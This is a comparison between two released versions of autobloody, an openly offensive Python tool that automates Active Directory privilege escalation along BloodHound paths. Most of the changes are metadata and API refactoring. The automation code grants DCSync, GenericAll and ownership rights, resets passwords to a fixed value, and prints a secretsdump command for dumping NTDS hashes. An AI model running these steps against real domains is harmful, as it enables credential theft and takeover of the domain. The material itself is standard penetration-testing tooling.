# Comparing `tmp/autobloody-0.1.3.tar.gz` & `tmp/autobloody-0.1.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "autobloody-0.1.3.tar", last modified: Sun Oct 23 19:35:25 2022, max compression
+gzip compressed data, was "autobloody-0.1.6.tar", last modified: Sun Apr 16 21:49:35 2023, max compression
```

## Comparing `autobloody-0.1.3.tar` & `autobloody-0.1.6.tar`

### file list

```diff
@@ -1,19 +1,19 @@
-drwxr-xr-x   0 silver    (1000) silver    (1001)        0 2022-10-23 19:35:25.623715 autobloody-0.1.3/
--rw-r--r--   0 silver    (1000) silver    (1001)     1069 2022-09-07 15:22:36.000000 autobloody-0.1.3/LICENSE
--rw-r--r--   0 silver    (1000) silver    (1001)     5066 2022-10-23 19:35:25.623715 autobloody-0.1.3/PKG-INFO
--rw-r--r--   0 silver    (1000) silver    (1001)     4271 2022-09-16 11:36:49.000000 autobloody-0.1.3/README.md
-drwxr-xr-x   0 silver    (1000) silver    (1001)        0 2022-10-23 19:35:25.623715 autobloody-0.1.3/autobloody/
--rw-r--r--   0 silver    (1000) silver    (1001)        0 2022-09-07 15:22:36.000000 autobloody-0.1.3/autobloody/__init__.py
--rw-r--r--   0 silver    (1000) silver    (1001)     6166 2022-10-23 19:33:37.000000 autobloody-0.1.3/autobloody/automation.py
--rw-r--r--   0 silver    (1000) silver    (1001)     5223 2022-10-23 19:33:37.000000 autobloody-0.1.3/autobloody/database.py
--rwxr-xr-x   0 silver    (1000) silver    (1001)     3639 2022-10-23 19:34:11.000000 autobloody-0.1.3/autobloody/main.py
--rw-r--r--   0 silver    (1000) silver    (1001)     3066 2022-10-23 19:33:37.000000 autobloody-0.1.3/autobloody/proxy_bypass.py
-drwxr-xr-x   0 silver    (1000) silver    (1001)        0 2022-10-23 19:35:25.623715 autobloody-0.1.3/autobloody.egg-info/
--rw-r--r--   0 silver    (1000) silver    (1001)     5066 2022-10-23 19:35:25.000000 autobloody-0.1.3/autobloody.egg-info/PKG-INFO
--rw-r--r--   0 silver    (1000) silver    (1001)      349 2022-10-23 19:35:25.000000 autobloody-0.1.3/autobloody.egg-info/SOURCES.txt
--rw-r--r--   0 silver    (1000) silver    (1001)        1 2022-10-23 19:35:25.000000 autobloody-0.1.3/autobloody.egg-info/dependency_links.txt
--rw-r--r--   0 silver    (1000) silver    (1001)       52 2022-10-23 19:35:25.000000 autobloody-0.1.3/autobloody.egg-info/entry_points.txt
--rw-r--r--   0 silver    (1000) silver    (1001)       29 2022-10-23 19:35:25.000000 autobloody-0.1.3/autobloody.egg-info/requires.txt
--rw-r--r--   0 silver    (1000) silver    (1001)       11 2022-10-23 19:35:25.000000 autobloody-0.1.3/autobloody.egg-info/top_level.txt
--rw-r--r--   0 silver    (1000) silver    (1001)       38 2022-10-23 19:35:25.623715 autobloody-0.1.3/setup.cfg
--rw-r--r--   0 silver    (1000) silver    (1001)     1226 2022-10-23 19:33:37.000000 autobloody-0.1.3/setup.py
+drwxr-xr-x   0 silver    (1000) silver    (1001)        0 2023-04-16 21:49:35.181360 autobloody-0.1.6/
+-rw-r--r--   0 silver    (1000) silver    (1001)     1069 2022-09-07 15:22:36.000000 autobloody-0.1.6/LICENSE
+-rw-r--r--   0 silver    (1000) silver    (1001)     4968 2023-04-16 21:49:35.181360 autobloody-0.1.6/PKG-INFO
+-rw-r--r--   0 silver    (1000) silver    (1001)     4271 2022-09-16 11:36:49.000000 autobloody-0.1.6/README.md
+drwxr-xr-x   0 silver    (1000) silver    (1001)        0 2023-04-16 21:49:35.181360 autobloody-0.1.6/autobloody/
+-rw-r--r--   0 silver    (1000) silver    (1001)        0 2022-09-07 15:22:36.000000 autobloody-0.1.6/autobloody/__init__.py
+-rw-r--r--   0 silver    (1000) silver    (1001)     6164 2023-04-16 21:45:27.000000 autobloody-0.1.6/autobloody/automation.py
+-rw-r--r--   0 silver    (1000) silver    (1001)     4245 2023-04-16 21:44:12.000000 autobloody-0.1.6/autobloody/database.py
+-rwxr-xr-x   0 silver    (1000) silver    (1001)     3639 2022-11-11 13:04:10.000000 autobloody-0.1.6/autobloody/main.py
+-rw-r--r--   0 silver    (1000) silver    (1001)     3066 2022-10-23 19:33:37.000000 autobloody-0.1.6/autobloody/proxy_bypass.py
+drwxr-xr-x   0 silver    (1000) silver    (1001)        0 2023-04-16 21:49:35.181360 autobloody-0.1.6/autobloody.egg-info/
+-rw-r--r--   0 silver    (1000) silver    (1001)     4968 2023-04-16 21:49:35.000000 autobloody-0.1.6/autobloody.egg-info/PKG-INFO
+-rw-r--r--   0 silver    (1000) silver    (1001)      349 2023-04-16 21:49:35.000000 autobloody-0.1.6/autobloody.egg-info/SOURCES.txt
+-rw-r--r--   0 silver    (1000) silver    (1001)        1 2023-04-16 21:49:35.000000 autobloody-0.1.6/autobloody.egg-info/dependency_links.txt
+-rw-r--r--   0 silver    (1000) silver    (1001)       52 2023-04-16 21:49:35.000000 autobloody-0.1.6/autobloody.egg-info/entry_points.txt
+-rw-r--r--   0 silver    (1000) silver    (1001)       29 2023-04-16 21:49:35.000000 autobloody-0.1.6/autobloody.egg-info/requires.txt
+-rw-r--r--   0 silver    (1000) silver    (1001)       11 2023-04-16 21:49:35.000000 autobloody-0.1.6/autobloody.egg-info/top_level.txt
+-rw-r--r--   0 silver    (1000) silver    (1001)       38 2023-04-16 21:49:35.181360 autobloody-0.1.6/setup.cfg
+-rw-r--r--   0 silver    (1000) silver    (1001)     1130 2023-04-16 21:46:26.000000 autobloody-0.1.6/setup.py
```

### Comparing `autobloody-0.1.3/LICENSE` & `autobloody-0.1.6/LICENSE`

 * *Files identical despite different names*

### Comparing `autobloody-0.1.3/PKG-INFO` & `autobloody-0.1.6/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,25 +1,23 @@
 Metadata-Version: 2.1
 Name: autobloody
-Version: 0.1.3
+Version: 0.1.6
 Summary: AD Privesc Automation
 Home-page: https://github.com/CravateRouge/autobloody
-Download-URL: https://github.com/CravateRouge/bloodyAD/archive/refs/tags/v0.1.3.tar.gz
+Download-URL: https://github.com/CravateRouge/autobloody/archive/refs/tags/v0.1.6.tar.gz
 Author: CravateRouge
 Author-email: baptiste.crepin@ntymail.com
 License: MIT
 Keywords: Active Directory,Privilege Escalation
 Classifier: Intended Audience :: Information Technology
 Classifier: License :: OSI Approved :: MIT License
-Classifier: Programming Language :: Python :: 3.6
-Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
-Requires-Python: >=3.6
+Requires-Python: >=3.8
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # ![bloodyAD logo](https://repository-images.githubusercontent.com/415977068/9b2fed72-35fb-4faa-a8d3-b120cd3c396f) autobloody
 `autobloody` is a tool to automatically exploit Active Directory privilege escalation paths shown by BloodHound.
 
 ## Description
```

### Comparing `autobloody-0.1.3/README.md` & `autobloody-0.1.6/README.md`

 * *Files identical despite different names*

### Comparing `autobloody-0.1.3/autobloody/automation.py` & `autobloody-0.1.6/autobloody/automation.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,8 +1,10 @@
-from bloodyAD import config, modules, utils
+import bloodyAD
+from bloodyAD import utils
+from bloodyAD.cli_modules import add, set, remove
 
 LOG = utils.LOG
 
 
 class Automation:
     def __init__(self, args, path):
         self.co_args = args
@@ -26,25 +28,25 @@
         }
         self.dirty_laundry = []
 
     def simulate(self):
         self.simulation = True
         self.rel_str = {
             "setDCSync": "[Add DCSync right] to {}",
-            "delObjectFromGroup": "[Add member] {} to the group {}",
-            "setGenericAll": "[Add GenericAll right] to {} for {}",
-            "setOwner": "[Give ownership] to {} for {}",
-            "changePassword": "[Change password] of {} to {}",
+            "groupMember": "[Membership] on group {} for {}",
+            "genericAll": "[GenericAll given] on {} to {}",
+            "owner": "[Ownership Given] on {} to {}",
+            "password": "[Change password] of {} to {}",
         }
         print(f"\nAuthenticated as {self.co_args.username}:\n")
         self._unfold()
 
     def exploit(self):
         self.simulation = False
-        self.conn = config.ConnectionHandler(self.co_args)
+        self.conn = bloodyAD.ConnectionHandler(self.co_args)
         self._unfold()
         self.conn.close()
 
     def _unfold(self):
         for rel in self.path:
             if not self.simulation:
                 LOG.info("")
@@ -80,38 +82,38 @@
         if not self.simulation:
             print(
                 "[+] You can now dump the NTDS using: secretsdump.py"
                 f" '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'"
             )
 
     def _setDCSync(self, rel):
-        operation = modules.setDCSync
+        operation = add.setDCSync
         if self.simulation:
             user = rel["start_node"]["name"]
             self._printOperation(operation.__name__, [user])
         else:
             user = rel["start_node"]["distinguishedname"]
             operation(self.conn, user)
 
     def _ownerDomain(self, rel):
         self._setOwner(rel)
         self._setDCSync(rel)
 
     def _addMember(self, rel):
-        operation = modules.delObjectFromGroup
+        add_operation = add.groupMember
         if self.simulation:
             member = rel["start_node"]["name"]
             group = rel["end_node"]["name"]
-            self._printOperation(operation.__name__, [member, group])
+            self._printOperation(add_operation.__name__, [group, member])
         else:
             member = rel["start_node"]["objectid"]
             group = rel["end_node"]["distinguishedname"]
-            modules.addForeignObjectToGroup(self.conn, member, group)
+            add_operation(self.conn, group, member)
             self.conn.close()
-        self.dirty_laundry.append({"f": operation, "args": [member, group]})
+        self.dirty_laundry.append({"f": remove.groupMember, "args": [group, member]})
 
     def _aclGroup(self, rel):
         self._genericAll(rel)
         self._addMember(rel)
 
     def _ownerGroup(self, rel):
         self._setOwner(rel)
@@ -129,49 +131,49 @@
         self._setOwner(rel)
         self._genericAll(rel)
 
     # TODO: change password change with shadow credentials when it's possible
     # TODO: don't perform change password if it's explicitly refused by user
     def _forceChangePassword(self, rel):
         pwd = "Password123!"
-        operation = modules.changePassword
+        operation = set.password
         if self.simulation:
             user = rel["end_node"]["name"]
             self._printOperation(operation.__name__, [user, pwd])
         else:
             user = rel["end_node"]["distinguishedname"]
             operation(self.conn, user, pwd)
             user = utils.search(self.conn, user, attr="sAMAccountName")[0][
                 "attributes"
             ]["sAMAccountName"]
             LOG.debug(f"[+] switching to LDAP connection for user {user}")
         self._switchUser(user, pwd)
 
     def _genericAll(self, rel):
-        operation = modules.setGenericAll
+        add_operation = add.genericAll
         if self.simulation:
             user = rel["start_node"]["name"]
             target = rel["end_node"]["name"]
-            self._printOperation(operation.__name__, [user, target])
+            self._printOperation(add_operation.__name__, [target, user])
         else:
             user = rel["start_node"]["distinguishedname"]
             target = rel["end_node"]["distinguishedname"]
-            operation(self.conn, user, target)
-        self.dirty_laundry.append({"f": operation, "args": [user, target, "False"]})
+            add_operation(self.conn, target, user)
+        self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})
 
     def _setOwner(self, rel):
-        operation = modules.setOwner
+        operation = set.owner
         if self.simulation:
             user = rel["start_node"]["name"]
             target = rel["end_node"]["name"]
-            self._printOperation(operation.__name__, [user, target])
+            self._printOperation(operation.__name__, [target, user])
         else:
             user = rel["start_node"]["distinguishedname"]
             target = rel["end_node"]["distinguishedname"]
-            operation(self.conn, user, target)
+            operation(self.conn, target, user)
 
     def _printOperation(self, operation_name, operation_args, revert=False):
         operation_str = "\t"
         if revert:
             operation_str += "[-] Revert "
         else:
             operation_str += "[+] "
```

### Comparing `autobloody-0.1.3/autobloody/main.py` & `autobloody-0.1.6/autobloody/main.py`

 * *Files identical despite different names*

### Comparing `autobloody-0.1.3/autobloody/proxy_bypass.py` & `autobloody-0.1.6/autobloody/proxy_bypass.py`

 * *Files identical despite different names*

### Comparing `autobloody-0.1.3/autobloody.egg-info/PKG-INFO` & `autobloody-0.1.6/autobloody.egg-info/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,25 +1,23 @@
 Metadata-Version: 2.1
 Name: autobloody
-Version: 0.1.3
+Version: 0.1.6
 Summary: AD Privesc Automation
 Home-page: https://github.com/CravateRouge/autobloody
-Download-URL: https://github.com/CravateRouge/bloodyAD/archive/refs/tags/v0.1.3.tar.gz
+Download-URL: https://github.com/CravateRouge/autobloody/archive/refs/tags/v0.1.6.tar.gz
 Author: CravateRouge
 Author-email: baptiste.crepin@ntymail.com
 License: MIT
 Keywords: Active Directory,Privilege Escalation
 Classifier: Intended Audience :: Information Technology
 Classifier: License :: OSI Approved :: MIT License
-Classifier: Programming Language :: Python :: 3.6
-Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
-Requires-Python: >=3.6
+Requires-Python: >=3.8
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # ![bloodyAD logo](https://repository-images.githubusercontent.com/415977068/9b2fed72-35fb-4faa-a8d3-b120cd3c396f) autobloody
 `autobloody` is a tool to automatically exploit Active Directory privilege escalation paths shown by BloodHound.
 
 ## Description
```

### Comparing `autobloody-0.1.3/setup.py` & `autobloody-0.1.6/setup.py`

 * *Files 26% similar despite different names*

```diff
@@ -2,33 +2,31 @@
 from pathlib import Path
 
 this_directory = Path(__file__).parent
 long_description = (this_directory / "README.md").read_text()
 
 setup(
     name="autobloody",
-    version="0.1.3",
+    version="0.1.6",
     description="AD Privesc Automation",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="CravateRouge",
     author_email="baptiste.crepin@ntymail.com",
     url="https://github.com/CravateRouge/autobloody",
     download_url=(
-        "https://github.com/CravateRouge/bloodyAD/archive/refs/tags/v0.1.3.tar.gz"
+        "https://github.com/CravateRouge/autobloody/archive/refs/tags/v0.1.6.tar.gz"
     ),
     packages=["autobloody"],
     license="MIT",
-    install_requires=["bloodyAD>=0.1.8", "neo4j>=4.4.6"],
+    install_requires=["bloodyAD>=1.0.0", "neo4j>=4.4.6"],
     keywords=["Active Directory", "Privilege Escalation"],
     classifiers=[
         "Intended Audience :: Information Technology",
         "License :: OSI Approved :: MIT License",
-        "Programming Language :: Python :: 3.6",
-        "Programming Language :: Python :: 3.7",
         "Programming Language :: Python :: 3.8",
         "Programming Language :: Python :: 3.9",
         "Programming Language :: Python :: 3.10",
     ],
-    python_requires=">=3.6",
+    python_requires=">=3.8",
     entry_points={"console_scripts": ["autobloody = autobloody.main:main"]},
 )
```

